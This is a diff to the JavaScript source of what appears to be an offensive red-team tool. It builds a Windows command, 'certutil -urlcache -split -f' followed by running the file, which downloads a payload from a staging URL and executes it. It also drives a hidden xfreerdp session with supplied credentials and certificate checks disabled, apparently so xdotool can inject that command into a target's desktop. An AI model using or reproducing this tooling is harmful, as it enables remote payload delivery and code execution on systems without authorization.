@@ -16539,12 +16539,14 @@ async function ipcRun(action) {
       if (!surl) { toast('Enter Staging URL', 'error'); return; }
       const winCmd    = `cmd /c certutil -urlcache -split -f ${surl} ${rpath} && ${rpath}`;
       const winCmdEsc = winCmd.replace(/'/g, "'\\''");
+      // xfreerdp without the DISPLAY prefix so $VDISP is not overridden
+      const xfreeCmd  = `xfreerdp /v:${a.target}${rdpDom} /u:'${a.user}' ${rdpCreds} /cert:ignore /w:800 /h:600 /log-level:OFF`;
+      // Background commands must combine & and $! capture in one statement to avoid &; syntax error
       const steps = [
         `VDISP=:$(( RANDOM % 400 + 200 ))`,
-        `Xvfb "$VDISP" -screen 0 1024x768x16 &`,
-        `XVFB_PID=$!`,
+        `Xvfb "$VDISP" -screen 0 1024x768x16 & XVFB_PID=$!`,
         `sleep 1`,
-        `DISPLAY="$VDISP" XAUTHORITY="" ${rdpBase} /w:800 /h:600 /log-level:OFF & XPID=$!`,
+        `DISPLAY="$VDISP" XAUTHORITY="" ${xfreeCmd} & XPID=$!`,
         `sleep 10`,
         `WID=$(DISPLAY="$VDISP" xdotool search --pid $XPID 2>/dev/null | head -1)`,
         `[ -z "$WID" ] && WID=$(DISPLAY="$VDISP" xdotool search --class xfreerdp 2>/dev/null | tail -1)`,
